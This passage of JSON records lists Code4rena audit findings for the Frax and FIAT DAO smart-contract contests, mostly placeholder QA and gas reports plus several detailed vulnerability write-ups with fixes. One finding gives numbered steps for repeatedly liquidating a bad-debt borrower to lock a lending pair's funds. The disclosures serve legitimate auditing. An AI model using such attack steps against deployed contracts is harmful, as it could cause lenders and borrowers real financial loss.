"Unprotected updation of whitelist"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/106", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/105", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/104", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/103", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Any borrower with bad debt can be liquidated multiple times to lock funds in the lending pair", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/102", "labels": ["bug", "3 (High Risk)", "high quality report", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L997-L1015   # Vulnerability details  ## Impact  Leftover shares in `liquidateClean` are only subtracted from pair totals, but not from user's borrowed shares. This means that after `liquidateClean`, borrower's shares will be greater than `0` (leftover shares after liquidations), but the user is still insolvent and can be liquidated again and again (with `_sharesToLiquidate` set to `0`). Each subsequent liquidation will write off the bad debt (reduce pair totals by borrower leftover shares/amounts), but doesn't take anything from liquidator nor borrower (since `_sharesToLiquidate == 0`).  This messes up the whole pair accounting, with total asset amounts reducing and total borrow amounts and shares reducing. This will make it impossible for borrowers to repay debt (or be liquidated), because borrow totals will underflow, and lenders amount to withdraw will reduce a lot (they will share non-existant huge bad debt).  Reducing pair totals scenario: 1. Alice borrows `1000 FRAX` (`1000` shares) against `1.5 ETH` collateral (`1 ETH = 1000`, `Max LTV` = `75%`) 2. ETH drops to `500` very quickly with liquidators being unable to liquidate Alice due to network congestion 3. At ETH = `500`, Alice collateral is worth `750` against `1000 FRAX` debt, making Alice insolvent and in a bad debt 4. Liquidator calls `liquidateClean` for `800` shares, which cleans up all available collateral of `1.5 ETH`. 5. At this point Alice has `200` shares debt with `0` collateral 6. Liquidator repeatedly calls `liquidateClean` with `0` shares to liquidate. Each call pair totals are reduced by `200` shares (and total borrow amount by a corresponding amount). 7. When pair totals reach close to `0`, the pool is effectively locked. Borrowers can't repay, lenders can withdraw severly reduced amounts.  ## Proof of Concept  Copy this to src/test/e2e/LiquidationBugTest.sol  https://gist.github.com/panprog/cbdc1658d63c30c9fe94127a4b4b7e72   ## Recommended Mitigation Steps  After the line  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L1012  add          _sharesToLiquidate += _sharesToAdjust;"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/101", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/100", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Liquidator might end up paying much more asset than collateral received", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/99", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-08-frax-findings", "body": "Liquidator might end up paying much more asset than collateral received"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/97", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/96", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/95", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/94", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/91", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/88", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/87", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Whitelist lender can prevent liquidation by removing all other lenders from whitelist", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/80", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "Whitelist lender can prevent liquidation by removing all other lenders from whitelist"}, {"title": "FraxlendPair.sol is not fully EIP-4626 compliant", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/79", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L136-L138 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L140-L142   # Vulnerability details  ## Impact FraxlendPair.sol is not EIP-4626 compliant, variation from the standard could break composability and potentially lead to loss of funds  ## Proof of Concept  According to EIP-4626 method specifications (https://eips.ethereum.org/EIPS/eip-4626)  For maxDeposit:      MUST factor in both global and user-specific limits, like if deposits are entirely disabled (even temporarily) it MUST return 0.  For maxMint:      MUST factor in both global and user-specific limits, like if mints are entirely disabled (even temporarily) it MUST return 0.  When FraxlendPair.sol is paused, deposit and mint are both disabled. This means that maxMint and maxDeposit should return 0 when the contract is paused.   The current implementations of maxMint and maxDeposit do not follow this specification:      function maxDeposit(address) external pure returns (uint256) {         return type(uint128).max;     }      function maxMint(address) external pure returns (uint256) {         return type(uint128).max;     }  No matter the state of the contract they always return uint128.max, but they should return 0 when the contract is paused.  ## Tools Used  ## Recommended Mitigation Steps  maxDeposit and maxMint should be updated to return 0 when contract is paused. Use of the whenNotPaused modifier is not appropriate because that would cause a revert and maxDeposit and maxMint should never revert according to EIP-4626"}, {"title": "Denial of service in globalPause by wrong logic", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/76", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairDeployer.sol#L405   # Vulnerability details  ## Impact The method `globalPause` is not tested and it doesn't work as expected.  ## Proof of Concept Because the method returns an array (`_updatedAddresses`) and has never been initialized, when you want to set its value, it fails.  Recipe:  - Call `globalPause` with any valid address. - The transaction will FAULT.  ## Affected source code  - [FraxlendPairDeployer.sol#L405](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairDeployer.sol#L405)  ## Recommended Mitigation Steps  Initialize the `_updatedAddresses` array like shown bellow:  ```diff     function globalPause(address[] memory _addresses) external returns (address[] memory _updatedAddresses) {         require(msg.sender == CIRCUIT_BREAKER_ADDRESS, \"Circuit Breaker only\");         address _pairAddress;         uint256 _lengthOfArray = _addresses.length; +       _updatedAddresses = new address[](_lengthOfArray);         for (uint256 i = 0; i < _lengthOfArray; ) {             _pairAddress = _addresses[i];             try IFraxlendPair(_pairAddress).pause() {                 _updatedAddresses[i] = _addresses[i];             } catch {}             unchecked {                 i = i + 1;             }         }     } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/74", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/72", "labels": ["bug", "high quality report", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/71", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/70", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/69", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/68", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/67", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/66", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/63", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/62", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/61", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/60", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/59", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/58", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/55", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/54", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Different rounding scheme when withdrawing fees", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/53", "labels": ["bug", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-08-frax-findings", "body": "Different rounding scheme when withdrawing fees"}, {"title": "No incentives to write off bad debt when remaining collateral is very small", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/38", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-08-frax-findings", "body": "No incentives to write off bad debt when remaining collateral is very small"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/34", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/32", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/31", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/30", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/29", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/28", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/27", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/26", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/25", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/24", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/23", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/17", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/16", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/8", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/7", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/6", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/3", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/1", "labels": [], "target": "2022-08-frax-findings", "body": "Agreements & Disclosures"}, {"title": "Blocklist.block() is avoidable with frontrun by targets", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/328", "labels": ["bug", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-08-fiatdao-findings", "body": "Blocklist.block() is avoidable with frontrun by targets"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/327", "labels": ["bug", "G (Gas Optimization)", "high quality report"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/324", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/323", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/322", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/321", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/320", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/319", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "`increaseUnlockTime` missing `_checkpoint` for delegated values", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/318", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "sponsor confirmed"], "target": "2022-08-fiatdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L509-L515   # Vulnerability details  ### [PNM-001] `increaseUnlockTime` missing `_checkpoint` for delegated values.   #### Links  + https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L509-L515  #### Description  In the VotingEscrow contract, users can increase their voting power by: + Adding more funds to their delegated valule + Increasing the time of their lock + Being delegated by another user  Specifically, when users are delegated by other users through the `delegate` function, the delegated user gains control over the delegate funds from the delegating user.   The delegated user can further increase this power by increasing the time that the delegated funds are locked by calling `increaseUnlockTime`, resulting in ALL the delegated funds controlled by the delegated user, including those that do not originate from the delegated user, being used to increase the voting power of the user.  The issue lies in the following scenario: If user A delegates to user B, and then user B delegates to user C, user B loses the ability to extend his or her voting power by `increaseUnlockTime` due to a missing `_checkpoint` operation. If user B calls the `increaseUnlockTime` function, the `_checkpoint` operation will not proceed, as user B is delegating to user C. However, B still owns delegated funds, in the form of the funds delegated from user A. Therefore, user B should still gain voting power from `increaseUnlockTime`, even though user B is delegating.  #### PoC / Attack Scenario  Assume three users, Alice, Bob, and Carol, who each possess `locks` with 10 units of `delegate` value. Also assume that the unlock time is 1 week.  + Alice delegates her 10 units to Bob. + Bob then delegates his 10 units to Carol. + At this point, Alice has 0 `delegate`, value, Bob has 10 `delegate` value, and Carol has 20 `delegate` value. + Carol calls `increaseUnlockTime` to 2 weeks, resulting in `_checkpoint` raising her voting power accordingly. + Bob calls `increaseUnlockTime` to 2 weeks, resulting in no change in his voting power, even though he has 10 units of `delegate` value.   #### Suggested Fix  Move the `_checkpoint` outside of the `if` statement on line 514.  ---"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/317", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/314", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/313", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/312", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/311", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/310", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/309", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/308", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/307", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/306", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/305", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/304", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/303", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/301", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/300", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/299", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/297", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Wrong logic in `_checkpoint()` function might lead to wrong value of `balanceOfAt()`, `totalSupplyAt()`", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/294", "labels": ["bug", "duplicate", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L257-L264 https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L372   # Vulnerability details  ## Impact  In function `_checkpoint()`, new values of `userPointHistory` and `pointHistory` are override old values instead of appending to the end of the list, i.e creating new element.  The result is if we try to get `balanceOf` or `totalSupply` at current block number, it just return wrong value because values of `globalEpoch` is overrided.  ## Proof of Concept  [Line 257-264](https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L257-L264) ```solidity if (uEpoch == 0) {     userPointHistory[_addr][uEpoch + 1] = userOldPoint; }  userPointEpoch[_addr] = uEpoch + 1; userNewPoint.ts = block.timestamp; userNewPoint.blk = block.number; userPointHistory[_addr][uEpoch + 1] = userNewPoint; ```  When `uEpoch == 0`, values of `userPointHistory` with `index = uEpoch + 1` is updated to `userOldPoint` but in line 264, values of `userPointHistory` with `index = uEpoch + 1` is overrided to `userNewPoint` which basically makes line 257-259 has no meaning.  Similarly issue with value of `pointHistory[epoch]` in [line 372](https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L372)  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Update logic of `_checkpoint()`, for example, use `++` operator to make sure `epoch` is increased each time it appends new element.   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/293", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/292", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/291", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/290", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/289", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/287", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/286", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/285", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/284", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/283", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/278", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/277", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/276", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/275", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/274", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/272", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/266", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/265", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/264", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/262", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/260", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": 